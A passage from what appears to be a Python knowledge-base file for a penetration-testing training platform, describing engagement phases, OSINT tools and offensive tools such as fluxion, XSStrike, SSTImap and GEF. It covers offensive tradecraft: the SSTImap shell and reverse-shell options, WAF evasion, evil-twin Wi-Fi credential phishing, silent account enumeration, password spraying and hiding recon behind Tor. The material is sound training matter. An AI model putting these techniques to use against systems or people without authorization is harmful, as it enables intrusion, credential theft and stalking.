            "Expect to LOOP: a post-ex foothold (phase 5) often reveals new hosts, sending you back to recon (2) on the internal network. Track that in your notes.",
            "Map your ERR0RS missions to this: Mission 03 (OSINT) is phase 2, Mission 01 (recon) is phase 3, Mission 02 (SQLi) is phase 4 — the platform walks the lifecycle.",
        ],
    },

    "scoping": {
        "summary": "Defining WHAT you're allowed to test, HOW, and WHEN — the contract that makes it legal",
        "typical": "Signed authorization + IP/domain scope list + ROE + testing window + emergency contacts",
        "flags": {
            "Authorization":     "Written permission from someone who OWNS the assets. Verbal isn't enough.",
            "Scope (in/out)":    "Explicit list of IPs, domains, apps that ARE and ARE NOT fair game.",
            "Rules of Engagement":"Allowed techniques. Is social engineering ok? DoS testing? Physical?",
            "Testing window":    "When you may test. Business hours? After-hours? Blackout dates?",
            "Data handling":     "What you may access, exfil, store, and how you destroy it after.",
            "Emergency contact": "Who to call if you break something or find an active breach.",
            "Get-out-of-jail":   "A signed authorization letter you carry — proves you're not a criminal.",
        },
        "read": [
            "Scope creep is the #1 way pentesters get in legal trouble — stay inside the lines",
            "If you find a vuln that leads OUT of scope, STOP and ask before following it",
            "Cloud assets need the PROVIDER's permission too (AWS/Azure have their own rules)",
            "'Out of scope' findings can still be reported as observations — just don't test them",
            "The scope document protects YOU as much as the client",
        ],
        "next": ["target-identification", "engagement-lifecycle", "recon-theory"],
        "caution": "No signed authorization = no testing. Ever. This is the line between pentester and criminal.",
        "cia": [
            "Scoping protects the client's Availability — the ROE and testing window are what stop your test from accidentally taking down production.",
            "It also protects the client's Confidentiality via the data-handling rules (what you may access, store, and how you destroy it), and YOUR integrity via the signed authorization.",
        ],
        "apply": [
            "Before ANY packet: get a signed authorization from someone who actually owns the assets. Carry the get-out-of-jail letter. No signature = no test, full stop.",
            "Build an explicit in-scope / out-of-scope list of IPs, domains, and apps. Paste it where you'll see it constantly so you never stray.",
            "Confirm the ROE specifics in writing: is social engineering allowed? DoS testing? physical? After-hours only? Each 'yes/no' changes which tools you may run.",
            "When you find a vuln that pivots OUT of scope, STOP and ask before following it — chasing it is the #1 way testers get into legal trouble.",
            "For cloud assets, verify the PROVIDER's rules too (AWS/Azure/GCP have their own pentest policies) — the client's permission alone isn't always enough.",
        ],
    },

    "target-identification": {
        "summary": "Going from 'a company name' to a concrete, in-scope list of assets to test",
        "typical": "Company → domains → subdomains → IP ranges (ASN) → live hosts → services → attack surface",
        "flags": {
            "Seed data":      "Start from what scope gives you: a domain, a company name, an IP block.",
            "Domain expansion":"Find all domains the org owns (whois, reverse-whois, cert transparency).",
            "Subdomain enum": "subfinder/amass turn one domain into dozens of subdomains.",
            "ASN / IP ranges":"Find the org's owned IP blocks via ASN lookup (bgp.he.net, whois).",
            "Live host detection":"Which of those IPs/hosts actually respond? (the in-scope ones only)",
            "Attack surface mapping":"Catalog every service, app, and entry point you found.",
            "Asset validation":"Confirm each asset is IN SCOPE before you touch it actively.",
        },
        "read": [
            "Cert transparency logs (crt.sh) are gold — they leak subdomains for free, passively",
            "An ASN lookup tells you every IP block a company owns — huge for scoping",
            "Acquisitions matter: BigCorp may own SmallCo's domains too — check whois history",
            "Shadow IT (forgotten dev/staging boxes) is where the easy wins usually hide",
            "Always cross-check found assets against your authorized scope before scanning",
        ],
        "next": ["subfinder", "amass", "theHarvester", "recon-theory"],
        "caution": "Finding an asset doesn't mean it's in scope. Validate ownership + authorization before active testing.",
        "cia": [
            "This phase defines the Confidentiality attack surface — every asset you enumerate is a place the org's data could leak from.",
            "It's pure mapping, so it doesn't touch Integrity or Availability itself — but a complete map is what makes the LATER triad testing thorough.",
        ],
        "apply": [
            "Start from the scope seed (a domain or company name) and expand outward: domains → subdomains (subfinder/amass) → IP ranges (ASN lookup at bgp.he.net) → live hosts → services.",
            "Pull cert-transparency logs (crt.sh) first — they leak subdomains for free, passively, and often reveal dev/staging hosts.",
            "Run an ASN lookup on the org to find every IP block they own — that's how one company name becomes a full network range to (in-scope) test.",
            "Check whois history and acquisitions — BigCorp may own SmallCo's domains; those count too if scope says so.",
            "CRITICAL gate: before any active scan, cross-check every discovered asset against your authorized scope list. Found ≠ authorized. Validate ownership first.",
        ],
    },

    "recon-theory": {
        "summary": "The discipline of gathering intel — passive vs active, and why you always start passive",
        "typical": "Passive OSINT (no target contact) → Semi-passive → Active recon (direct contact, logged)",
        "flags": {
            "Passive recon":  "Zero packets to the target. Public data: search engines, certs, DNS, social media. Undetectable.",
            "Semi-passive":   "Light, normal-looking traffic: visiting their website, public DNS lookups. Blends in.",
            "Active recon":   "Direct probing: port scans, service enum. Effective but LOGGED on the target side.",
            "Attribution":    "Can the target trace recon back to you? Passive = no. Active = yes, unless proxied.",
            "OSINT-first":    "Exhaust passive sources BEFORE going active — you often won't need to make noise.",
            "Footprinting":   "Building the complete external picture: people, tech, infra, exposure.",
        },
        "read": [
            "Every active packet is potential evidence — passive recon leaves none",
            "A good OSINT phase means you arrive at active recon already knowing the answers",
            "Email formats + employee names (from LinkedIn) feed password spraying later",
            "Leaked credentials (HaveIBeenPwned, dumps) are passive AND devastating",
            "Tech stack fingerprints (whatweb, builtwith) tell you what exploits to prep",
        ],
        "next": ["subfinder", "theHarvester", "sherlock", "target-identification"],
        "caution": "Passive recon is undetectable BUT still bound by scope and privacy law. Public ≠ permission to harass.",
        "cia": [
            "Recon attacks Confidentiality first — every passive source you exhaust (certs, DNS, leaks, social) pulls data the org exposed without realizing it.",
            "Your OWN attribution is the Confidentiality concern on your side — active recon is logged and traceable; passive isn't. OPSEC is recon applied to yourself.",
        ],
        "apply": [
            "ALWAYS start passive: search engines, crt.sh, DNS, social media, HaveIBeenPwned. Zero packets to the target means zero detection and zero attribution.",
            "Exhaust passive before going active — a strong OSINT phase means you arrive at active recon already knowing the answers, so you make far less noise.",
            "Treat the passive→semi-passive→active ladder as a noise dial: climb it only as far as you must. Each rung up is more findings but more traceability.",
            "Harvest the high-value passive wins specifically: email format + employee names (feeds password spraying), leaked creds (devastating and free), tech fingerprints (tells you which exploits to prep).",
            "When you must go active, proxy it (VPN/Tor/redirector) so the target can't trace recon back to you — and confirm scope allows it first.",
        ],
    },

    "reporting": {
        "summary": "Turning findings into the deliverable the client actually pays for",
        "typical": "Executive summary → methodology → findings (with evidence + risk) → remediation → retest plan",
        "flags": {
            "Executive summary":  "1 page for leadership: what you found, the business risk, what to do. No jargon.",
            "Methodology":        "What you tested and how — proves thoroughness and scope adherence.",
            "Findings":           "Each: title, severity, affected assets, evidence (screenshots), reproduction steps.",
            "Risk rating":        "CVSS score + business context. A 'high' on a dev box may be a 'low' in practice.",
            "Remediation":        "Specific, actionable fixes. Not 'patch it' — exactly WHAT and HOW.",
            "Evidence":           "Screenshots, request/response pairs, command output. Reproducible proof.",
            "Retest plan":        "How you'll verify the fix worked. Closes the engagement loop.",
        },
        "read": [
            "The report outlives the engagement — it's the only artifact the client keeps",
            "Map every finding to CIA impact and a CVSS score for defensible severity",
            "Reproduction steps must be exact — a dev has to be able to follow them",
            "Lead with business risk, not technical detail — execs fund fixes, not CVEs",
            "ERR0RS has a Professional Reporter — type 'report' to generate one from your session",
        ],
        "next": ["cvss scoring", "engagement-lifecycle", "remediation retest"],
        "caution": "A finding with no evidence is an opinion. Always capture reproducible proof as you go.",
        "cia": [
            "The report's whole job is to translate every technical finding into CIA-and-business terms — that translation is what convinces a client to fund the fix.",
            "Reporting protects the client's Confidentiality directly: the document itself contains their vulnerabilities, so handle, encrypt, and transmit it as the sensitive asset it is.",
        ],
        "apply": [
            "Capture evidence AS YOU GO, never after — screenshot, save request/response pairs, copy command output the moment a finding lands. A finding with no proof is just an opinion.",
            "Write each finding with: title, CIA impact, CVSS score + business context, affected assets, and EXACT reproduction steps a developer can follow.",
            "Lead the executive summary with business risk in plain language ('an attacker could read all customer records'), not CVE numbers. Execs fund fixes, not jargon.",
            "Make remediation specific — not 'patch it' but 'upgrade OpenSSL to 3.0.x and disable TLS 1.0 in nginx.conf'. Actionable fixes get implemented; vague ones get ignored.",
            "In ERR0RS, type 'report' to auto-generate a professional report from your session — then refine the exec summary and business context by hand. The tool drafts; you judge.",
        ],
    },

    # ════════════════════════════════════════════════════════════════════
    #  OSINT TOOLS — passive-first external footprinting
    #  Domain/infra: subfinder, amass, dnsrecon, theHarvester
    #  People/identity: sherlock, holehe, recon-ng, spiderfoot
    # ════════════════════════════════════════════════════════════════════
    "subfinder": {
        "summary": "Fast passive subdomain discovery — queries 30+ public sources, never touches the target",
        "typical": "subfinder -d example.com -all -silent",
        "flags": {
            "-d":      "Target domain to enumerate subdomains for",
            "-all":    "Use ALL sources (slower, more thorough) vs the fast default set",
            "-silent": "Only print subdomains, no banner — clean for piping to other tools",
            "-o":      "Output to file: -o subs.txt",
            "-recursive":"Recursively find subdomains of discovered subdomains",
            "-dL":     "Read a LIST of domains from a file instead of one -d",
            "-cs":     "Include the source that found each subdomain (provenance)",
        },
        "read": [
            "Every result comes from PUBLIC data (cert logs, passive DNS) — the target sees nothing",
            "Pipe straight into httpx or nmap: subfinder -d x.com -silent | httpx",
            "More sources = more results but slower — start with default, add -all if thin",
            "Cross-check with amass for coverage neither tool has alone",
            "Configure API keys (~/.config/subfinder/) to unlock premium sources",
        ],
        "next": ["amass", "httpx", "nmap", "whatweb"],
        "caution": "Subdomains found ≠ in scope. Validate each against authorization before active scanning.",
        "cia": [
            "CONFIDENTIALITY — primary. Subdomains expose the org's attack surface — forgotten dev/staging hosts are where data leaks hide.",
            "INTEGRITY — indirect. A discovered host is a future target whose compromise could enable tampering.",
            "AVAILABILITY — none. Fully passive: queries public sources, never the target. Zero footprint, zero disruption.",
        ],
        "anatomy_cmd": "subfinder -d example.com -all -silent",
        "anatomy": {
            "subfinder":      "The binary.",
            "-d example.com": "ROOT DOMAIN to enumerate. SOURCE: your scope document — the one piece of seed data every external engagement starts from.",
            "-all":           "Use ALL data sources. Your thoroughness choice (slower, more results).",
            "-silent":        "Output only subdomains — clean for piping into httpx/nmap. Your convenience flag.",
        },
    },

    "amass": {
        "summary": "Deep attack-surface mapping — subdomains, ASNs, and infra relationships (passive or active)",
        "typical": "amass enum -passive -d example.com",
        "flags": {
            "enum":      "The enumeration subcommand (amass has intel/enum/viz/db modes)",
            "-passive":  "Passive only — no direct target contact, undetectable",
            "-active":   "Active — does DNS resolution + cert grabbing (touches target, more accurate)",
            "-d":        "Target domain",
            "-brute":    "Brute-force subdomains with a wordlist (active, noisier)",
            "-o":        "Output file",
            "-df":       "Domains-from-file for multi-domain enum",
            "intel":     "amass intel -org 'Company' finds domains/ASNs an org owns",
        },
        "read": [
            "amass intel -org 'Acme' maps every domain + IP block a company owns — huge for scoping",
            "-passive is safe for any phase; -active and -brute are louder and touch the target",
            "Deeper than subfinder but slower — use both, merge results",
            "amass viz generates a relationship graph of the discovered infrastructure",
            "Results persist in a local DB — amass db lets you query past enums",
        ],
        "next": ["subfinder", "target-identification", "nmap", "httpx"],
        "caution": "-active / -brute send packets to the target. Confirm scope before using them.",
        "cia": [
            "CONFIDENTIALITY — primary. Maps the full external footprint (subdomains, owned IP blocks) — the data-exposure surface.",
            "INTEGRITY — indirect. Each discovered asset is a potential foothold for later tampering.",
            "AVAILABILITY — mode-dependent. -passive = none. -active/-brute send DNS traffic to the target and are louder.",
        ],
        "anatomy_cmd": "amass enum -passive -d example.com",
        "anatomy": {
            "amass":          "The binary.",
            "enum":           "SUBCOMMAND (mode). enum=find subdomains, intel=find owned domains/ASNs, viz=graph, db=query past runs. You pick by goal.",
            "-passive":       "Stay third-party-only (undetectable). YOUR stealth choice; -active resolves against the target.",
            "-d example.com": "ROOT DOMAIN. SOURCE: scope. For 'amass intel -org Acme' you'd instead give the company NAME to find what it owns.",
        },
    },

    "dnsrecon": {
        "summary": "DNS enumeration — records, zone transfers, subdomain brute, reverse lookups",
        "typical": "dnsrecon -d example.com",
        "flags": {
            "-d":      "Target domain",
            "-t":      "Enumeration type: std, axfr (zone transfer), brt (brute), rvl (reverse)",
            "-t axfr": "Attempt zone transfer — a misconfig that dumps the ENTIRE DNS zone",
            "-t brt":  "Brute-force subdomains with a dictionary (-D wordlist.txt)",
            "-D":      "Dictionary file for brute-force mode",
            "-r":      "Reverse lookup over an IP range: -r 10.0.0.0/24",
            "-n":      "Use a specific name server",
        },
        "read": [
            "A successful zone transfer (axfr) is a jackpot — the whole DNS map, instantly",
            "std enumeration (A, MX, NS, TXT, SOA) is light and quick — start there",
            "SPF/DMARC TXT records reveal mail infra + sometimes third-party services",
            "Reverse lookups on a found IP range surface neighboring hosts",
            "Zone transfers rarely work on modern DNS but ALWAYS worth a try — costs nothing",
        ],
        "next": ["subfinder", "amass", "theHarvester", "nmap"],
        "caution": "DNS queries to the target's own name servers are semi-active and logged there.",
        "cia": [
            "CONFIDENTIALITY — primary. A zone transfer or rich record set leaks the org's internal map (hosts, mail, services).",
            "INTEGRITY — indirect. Surfaced hosts become targets; misconfigured DNS can itself be a tampering vector.",
            "AVAILABILITY — low. Queries hit the target's name servers (semi-active, logged there), but reading DNS doesn't disrupt it.",
        ],
        "anatomy_cmd": "dnsrecon -d example.com -t std",
        "anatomy": {
            "dnsrecon":       "The binary.",
            "-d example.com": "DOMAIN to enumerate. SOURCE: scope, or a subdomain you already found.",
            "-t std":         "ENUMERATION TYPE. std=safe record pull (start here), axfr=try zone transfer (jackpot if it works), brt=brute (needs -D wordlist), rvl=reverse over an IP range.",
            "(name servers)": "IMPLICIT TARGET: the domain's authoritative NS, discovered automatically from the NS records — that's why std queries are semi-active.",
        },
    },

    "theharvester": {
        "summary": "Harvests emails, names, subdomains, and hosts from public search engines and data sources",
        "typical": "theHarvester -d example.com -b all",
        "flags": {
            "-d":   "Target domain or company name",
            "-b":   "Data source: all, bing, google, linkedin, crtsh, hunter, etc.",
            "-b all":"Query every available source (broadest sweep)",
            "-l":   "Limit number of results per source",
            "-f":   "Save results to an HTML/XML report file",
            "-s":   "Use Shodan for discovered hosts (needs API key)",
            "-r":   "Take DNS reverse lookups on the found range",
        },
        "read": [
            "Emails reveal the org's address FORMAT (first.last@, flast@) — feeds password spraying",
            "Employee names from LinkedIn source build your target-user list",
            "crtsh source pulls subdomains from cert transparency — overlaps subfinder",
            "Different sources find different data — -b all then dedupe is the move",
            "Found emails → check HaveIBeenPwned for breach exposure (still passive)",
        ],
        "next": ["sherlock", "holehe", "recon-theory", "subfinder"],
        "caution": "Harvested PII (names, emails) is bound by privacy law. Use only for authorized engagements.",
        "cia": [
            "CONFIDENTIALITY — primary. Emails, employee names, and hosts are exactly the data attackers use to target people.",
            "INTEGRITY — indirect. The email FORMAT it reveals feeds the password-spray that later modifies systems.",
            "AVAILABILITY — none. Scrapes search engines and public datasets; the target's infra is never contacted.",
        ],
        "anatomy_cmd": "theHarvester -d example.com -b bing,crtsh,duckduckgo -l 100",
        "anatomy": {
            "theHarvester":   "The binary.",
            "-d example.com": "DOMAIN (or company name). SOURCE: scope. The thing you're profiling.",
            "-b bing,crtsh,...": "DATA SOURCES to query. SOURCE: built-in list (bing/crtsh/duckduckgo/linkedin/hunter...). Each finds different data — 'all' is broadest. crtsh pulls subdomains from cert logs.",
            "-l 100":         "LIMIT results per source. Your scope/speed dial.",
            "(output)":       "What you're hunting: the email FORMAT (first.last@ vs flast@) — the prize that feeds hydra/crackmapexec later.",
        },
    },

    "sherlock": {
        "summary": "Hunts a username across 400+ social networks and sites — maps a person's online presence",
        "typical": "sherlock johndoe",
        "flags": {
            "username":  "One or more usernames to search (space-separated)",
            "--timeout": "Seconds to wait per site (default 60 — lower it to go faster)",
            "--site":    "Check only specific sites: --site GitHub --site Twitter",
            "--csv":     "Export results to CSV",
            "--folderoutput":"Save per-username result files to a folder",
            "--nsfw":    "Include adult sites in the search",
        },
        "read": [
            "A username reused across sites links a person's accounts together — pivot points",
            "Found profiles → read bios/posts for more seed data (other handles, employer, location)",
            "False positives happen — always manually verify a hit before relying on it",
            "Pair with the email format from theHarvester to confirm identity overlaps",
            "Queries hit the SITES, not your target's infra — target sees nothing",
        ],
        "next": ["holehe", "theHarvester", "recon-theory"],
        "caution": "Profiling real people is privacy-sensitive. Stay within engagement scope — public ≠ permission to stalk.",
        "cia": [
            "CONFIDENTIALITY — primary. Links a person's accounts across the web, building the human-attack-surface picture.",
            "INTEGRITY — indirect. Profile data feeds a convincing phishing pretext that could later trick someone into an integrity-breaking action.",
            "AVAILABILITY — none. Queries the SITES, not your target's infrastructure. The target sees nothing.",
        ],
        "anatomy_cmd": "sherlock johndoe --timeout 10",
        "anatomy": {
            "sherlock":       "The binary.",
            "johndoe":        "USERNAME to hunt. SOURCE: a handle from theHarvester, a LinkedIn/GitHub name, an email local-part, or a profile you already found. The seed for people-OSINT.",
            "--timeout 10":   "Seconds per site. Your speed dial (default 60 is slow across 400+ sites).",
            "(output)":       "Confirmed profiles — but VERIFY manually (false positives happen). Each hit's bio seeds the next query (other handles, employer, location).",
        },
    },

    "holehe": {
        "summary": "Checks if an email is registered on 120+ sites — without alerting the target",
        "typical": "holehe target@example.com",
        "flags": {
            "email":      "The email address to check across sites",
            "--only-used":"Show only sites where the email IS registered (cleaner output)",
            "--no-color": "Plain output for piping/parsing",
            "--csv":      "Export to CSV",
            "-T":         "Timeout per request",
        },
        "read": [
            "Tells you WHERE a person has accounts (Twitter, Spotify, Adobe...) — expands the attack surface",
            "Uses password-reset / registration flows that DON'T notify the account owner",
            "Combine with sherlock: holehe finds accounts by email, sherlock by username",
            "Registered-account list informs phishing pretext + credential-stuffing targets",
            "Some sites rate-limit — spread checks out if you're doing many emails",
        ],
        "next": ["sherlock", "theHarvester", "recon-theory"],
        "caution": "Enumerating someone's accounts is sensitive recon. Authorized engagements only — respect privacy law.",
        "cia": [
            "CONFIDENTIALITY — primary. Reveals which services a person uses — the account map that widens the human attack surface.",
            "INTEGRITY — indirect. Knowing where someone has accounts informs credential-stuffing that could later alter those accounts.",
            "AVAILABILITY — none. Uses reset/registration flows on third-party sites; the target's own infra is never touched.",
        ],
        "anatomy_cmd": "holehe target@example.com --only-used",
        "anatomy": {
            "holehe":         "The binary.",
            "target@example.com": "EMAIL to check. SOURCE: an address harvested by theHarvester, guessed from the email FORMAT + an employee name, or from a breach dump.",
            "--only-used":    "Show only sites where the email IS registered. Your noise filter.",
            "(quiet by design)": "KEY PROPERTY: uses flows that DON'T notify the owner — no password-reset email lands in their inbox. That's why it's safe recon.",
        },
    },

    "recon-ng": {
        "summary": "Modular OSINT framework with a Metasploit-style console — automates multi-source recon",
        "typical": "recon-ng → marketplace install all → modules load recon/domains-hosts/...",
        "flags": {
            "marketplace search":"Find available modules (recon, discovery, reporting)",
            "marketplace install":"Install a module or 'all' to grab everything",
            "modules load":      "Load a module: modules load recon/domains-hosts/hackertarget",
            "options set SOURCE":"Set the input (e.g. the target domain) for the loaded module",
            "run":               "Execute the loaded module",
            "show hosts":        "Display results stored in the workspace database",
            "workspaces create": "Isolate each engagement in its own workspace + database",
        },
        "read": [
            "Everything is stored in a per-workspace DB — results from one module feed the next",
            "It's a FRAMEWORK: chain modules (domains→hosts→ports→contacts) into a pipeline",
            "Many modules need API keys (keys add shodan_api ...) for full power",
            "Reporting modules export polished HTML/CSV straight from the workspace",
            "Think of it as Metasploit for recon — same console muscle memory",
        ],
        "next": ["spiderfoot", "theHarvester", "amass", "target-identification"],
        "caution": "Some modules do ACTIVE lookups (DNS, port checks). Know which before running against a scoped target.",
        "cia": [
            "CONFIDENTIALITY — primary. Chains many sources into one workspace, building a deep data picture of the target.",
            "INTEGRITY — indirect. The intel it gathers feeds later access attempts that could modify systems.",
            "AVAILABILITY — module-dependent. Passive modules touch nothing; some modules do active DNS/port lookups. Know which before you run it.",
        ],
        "anatomy_cmd": "recon-ng -w acme → modules load recon/domains-hosts/hackertarget → run",
        "anatomy": {
            "recon-ng":       "The framework console (Metasploit-style).",
            "-w acme":        "WORKSPACE name. SOURCE: you name it per engagement — isolates this client's data in its own DB.",
            "modules load recon/domains-hosts/...": "MODULE to run. SOURCE: 'marketplace search' lists them; you pick by what you want (domains→hosts→ports→contacts).",
            "options set SOURCE <domain>": "INPUT for the module. SOURCE: your scope domain, or results already in the workspace DB from a previous module (that's the chaining).",
            "(API keys)":     "Many modules need 'keys add shodan_api ...' — sourced from your own free/paid API accounts.",
        },
    },

    "spiderfoot": {
        "summary": "Automated OSINT engine — point it at a target and it correlates 200+ data sources for you",
        "typical": "spiderfoot -l 127.0.0.1:5001  (then drive the web UI)",
        "flags": {
            "-l":      "Launch the web UI on host:port (then use the browser)",
            "-s":      "Scan target (CLI mode): -s example.com",
            "-t":      "Restrict to specific data types: -t EMAILADDR,IP_ADDRESS",
            "-m":      "Use only specific modules",
            "-q":      "Quiet — only output data, no status",
            "-o":      "Output format: tab, csv, json",
        },
        "read": [
            "Give it a domain/email/IP/name and it auto-pivots across sources building a graph",
            "Scan modes: Passive (safe), Investigate, or Footprint (some active) — pick deliberately",
            "The web UI visualizes relationships — great for spotting non-obvious connections",
            "Correlations surface what manual recon misses (shared infra, leaked data, exposed services)",
            "Heavier than single tools — use when you want breadth without manual chaining",
        ],
        "next": ["recon-ng", "amass", "theHarvester", "target-identification"],
        "caution": "Footprint/Investigate modes make active connections. Use Passive mode to stay undetectable.",
        "cia": [
            "CONFIDENTIALITY — primary. Auto-correlates 200+ sources into one graph — the broadest data picture of a target.",
            "INTEGRITY — indirect. Surfaced infra/leaks become the footholds for later integrity attacks.",
            "AVAILABILITY — mode-dependent. Passive mode touches nothing; Footprint/Investigate make active connections to the target. Choose deliberately.",
        ],
        "anatomy_cmd": "spiderfoot -s example.com -t DOMAIN_NAME,EMAILADDR -q",
        "anatomy": {
            "spiderfoot":     "The binary (or -l host:port to drive the web UI instead).",
            "-s example.com": "SCAN TARGET (a 'seed'). SOURCE: scope. The seed can be a domain, IP, email, or person's name — spiderfoot auto-pivots from it.",
            "-t DOMAIN_NAME,EMAILADDR": "DATA TYPES to collect. Your focus filter — constrains the crawl so it doesn't wander.",
            "(scan mode)":    "Pick deliberately: Passive (undetectable), Investigate, or Footprint (active, touches target). The seed TYPE + mode decide the noise.",
        },
    },

    # ══════════════════════════════════════════════════════════════
    # OFFENSIVE TOOLS — batch added with Eros, grounded in each tool's
    # real --help on the Pi (integrity-checked, no fabricated flags).
    # ══════════════════════════════════════════════════════════════

    "fluxion": {
        "summary": "Wi-Fi evil-twin & handshake-capture framework — phishes the WPA key with a fake captive portal",
        "typical": "cd /usr/share/fluxion && sudo ./fluxion.sh   # run from its dir (relative-path bug)",
        "flags": {
            "Captive Portal":   "Flagship attack: clones the AP, deauths clients off the real one, serves a fake router-login page, and VERIFIES the typed password against the captured handshake — no cracking needed.",
            "Handshake Snooper":"Capture the WPA 4-way handshake (deauth forces a reconnect), then crack it offline with hashcat/aircrack.",
            "deauth (mdk4)":    "Kicks clients off the real AP so they reconnect — to your evil twin, or so you catch the handshake.",
            "hostapd+lighttpd+dnsmasq":"The evil twin's parts: hostapd = rogue AP, lighttpd = phishing web server, dnsmasq = hands the victim IP/DNS so every page redirects to the portal.",
            "handshake verification":"Fluxion checks the entered password against the real handshake — a captured portal password is GUARANTEED correct (no false positives).",
            "monitor-mode iface":"Needs a card with monitor mode + injection (your Alfa AWUS036ACM). The Pi's internal wifi usually can't.",
        },
        "read": [
            "A captured handshake is the prerequisite for BOTH attacks — Captive Portal uses it to verify, Snooper hands it to a cracker.",
            "Captive Portal wins the moment the victim types their real wifi password into your fake page — no GPU, no wordlist.",
            "If clients will not deauth/reconnect, the handshake never lands — check injection support and that you are on the right channel.",
            "Snooper output is a .cap file — feed it to hashcat -m 22000 or aircrack-ng with a wordlist.",
            "The portal page is template-driven; fluxion ships pages that mimic common router brands.",
        ],
        "next": ["hashcat (-m 22000 crack the handshake)", "aircrack-ng (cap analysis)", "wifite (automated alternative)"],
        "caution": "Attacking Wi-Fi you do not own is a crime (rogue AP + deauth + credential phishing). Your OWN AP or explicit written authorization ONLY. The deauth flood knocks real users offline — a live availability impact, not a side effect.",
        "cia": [
            "CONFIDENTIALITY — primary. The whole goal is capturing the WPA pre-shared key, the network's master secret.",
            "AVAILABILITY — direct and unavoidable. The deauth flood disconnects legitimate clients; disruption is part of the attack.",
            "INTEGRITY — the evil twin is an active man-in-the-middle: once a victim associates to it, their traffic can be tampered with.",
        ],
    },

    "xsstrike": {
        "summary": "Advanced XSS suite — context-aware payloads, WAF fingerprinting, crawling, and a fuzzer (v3.1.5)",
        "typical": "xsstrike -u 'http://target/search?q=test' --crawl",
        "flags": {
            "-u TARGET":   "URL with a parameter to test (e.g. ?q=test) — the injection point.",
            "--data":      "POST body to test instead of a GET query string.",
            "--crawl":     "Spider the site first, then test every parameter it discovers.",
            "--fuzzer":    "Fuzz one parameter to study how the app/WAF reacts to payloads.",
            "-e / --encode":"Encode payloads to slip past filters.",
            "--blind":     "Inject a blind-XSS payload that fires later in someone else's browser (needs your collector).",
            "-l LEVEL":    "Test depth / how many payloads to try.",
            "--skip-dom":  "Skip the DOM-XSS static scan (faster) if you only want reflected/stored.",
            "-t / -d":     "Threads / delay — your speed-vs-stealth dial.",
            "--proxy":     "Route through Burp (127.0.0.1:8080) to inspect and replay.",
        },
        "read": [
            "XSStrike does not just spray payloads — it analyzes the REFLECTION CONTEXT (HTML body, attribute, script) and crafts one that actually fires there. That is why it beats blind spraying.",
            "It fingerprints the WAF first; a detected WAF is your cue to reach for --encode and evasion.",
            "A confirmed hit shows the exact payload + parameter + context — paste it into a browser to prove the popup fires.",
            "DOM-XSS results come from static JS analysis — verify them by hand, they can be noisy.",
            "It finds the injection; whether it PERSISTS (stored) is something you confirm by revisiting the page.",
        ],
        "next": ["dalfox (second-opinion XSS scanner)", "burp (manual confirmation + exploitation)", "the browser (prove it fires)"],
        "caution": "Authorized targets only. Stored-XSS payloads persist and can fire in real users' browsers — be careful what you inject on shared or live apps.",
        "cia": [
            "CONFIDENTIALITY — primary. XSS steals session cookies/tokens and reads page data as the victim — account takeover.",
            "INTEGRITY — high. Injected script can rewrite the page and submit actions as the victim.",
            "AVAILABILITY — low, but a malicious script can break or deface the page for anyone who loads it.",
        ],
    },

    "sstimap": {
        "summary": "Server-Side Template Injection scanner & exploiter — detects the engine, then escalates to code/OS execution",
        "typical": "sstimap -u 'http://target/page?name=test'",
        "flags": {
            "-u URL":      "Target URL with a parameter to test for SSTI.",
            "-d / -m":     "POST data / HTTP method for form-based injection points.",
            "-H / -C":     "Add a header / cookie (for authenticated testing).",
            "-c / -f":     "Crawl to a depth / include forms when hunting injection points.",
            "-e ENGINE":   "Force a template engine (Jinja2, Twig, Freemarker...) instead of auto-detect.",
            "-t":          "Detect-only — confirm the engine WITHOUT exploiting.",
            "-T / -X":     "Run raw template code / language eval through the injection.",
            "-S OS_CMD":   "Run a single OS command via the SSTI (the escalation payoff).",
            "-s":          "Drop into an interactive OS shell through the injection.",
            "-B / -R":     "Bind shell (port) / reverse shell (host port) through the SSTI.",
        },
        "read": [
            "SSTImap first DETECTS the engine by injecting math like {{7*7}} and watching for 49 — different engines render it differently, which is how it fingerprints them.",
            "Detection then tells it which sandbox-escape payload reaches code execution for THAT specific engine.",
            "Not every SSTI reaches RCE — some only leak data. -t shows how far it can go before you fire -S/-s.",
            "It is the maintained successor to tplmap — same idea, more engines, active development.",
            "An -S os-command success means full RCE on the server — the highest-impact web finding there is.",
        ],
        "next": ["reverse shell (-R your_ip port, catch with netcat)", "linpeas (privesc once you have the shell)", "burp (find more injection points)"],
        "caution": "RCE-class testing. -S/-s/-R execute code on the target server — systems you own or are explicitly authorized to test ONLY. Confirm scope before going past -t (detect-only).",
        "cia": [
            "CONFIDENTIALITY — high. Even detect-only SSTI can read server-side files and config through the template context.",
            "INTEGRITY — primary at full exploit. -S/-s give code execution = full ability to modify the server.",
            "AVAILABILITY — caution. Code execution means you can crash the app server; exploit deliberately, not blindly.",
        ],
    },

    "gef": {
        "summary": "GDB Enhanced Features — turns raw gdb into a usable exploit-dev & reverse-engineering cockpit",
        "typical": "gef   # launches: gdb -ex 'source /usr/share/gdb/gef.py'",
        "flags": {
            "checksec":    "Show a binary's protections at a glance: NX, PIE, RELRO, Stack Canary. Your first move on any target binary.",
            "context":     "GEF's auto-display on every stop: registers, stack, disassembly, source — the cockpit view.",
            "vmmap":       "Show the process memory map (segments + permissions) — find where stack/heap/libs live.",
            "pattern create / search":"Generate a cyclic pattern, crash with it, then find the exact offset that overwrote a register — classic overflow offset-finding.",
            "telescope <addr>":"Dereference-walk memory — follow pointers to see what's really on the stack/heap.",
            "heap chunks / bins":"Inspect glibc heap state — essential for heap exploitation (UAF, tcache).",
            "ropper / ropgadget":"Find ROP gadgets to bypass NX, then chain them into a payload.",
        },
        "read": [
            "checksec output dictates your whole strategy: NX on -> need ROP/ret2libc; PIE/ASLR on -> need a leak first; no canary -> straight stack smash.",
            "The context view updates on every breakpoint — read registers (RIP/RSP) and the stack together to see exactly what your input did.",
            "pattern create, crash it, then pattern search $rsp gives the exact byte offset to the return address — no manual counting.",
            "vmmap shows which regions are executable — where shellcode could live, or confirms NX forced you to ROP.",
            "GEF is just GDB with batteries — every normal gdb command (break, run, ni, si, x/) still works underneath.",
        ],
        "next": ["ropper / ROPgadget (build the chain)", "pwntools (script the exploit in Python)", "decompiler (understand the bug)"],
        "caution": "Debug binaries you own or are authorized to analyze — CTFs, your own programs, authorized research. This is exploit-development tradecraft.",
        "cia": [
            "INTEGRITY — primary. Exploit dev is about achieving code execution: making a program do what it was never meant to (the ultimate integrity break).",
            "CONFIDENTIALITY — secondary. Memory inspection (telescope, x/) reads secrets, keys, and canaries straight out of process memory.",
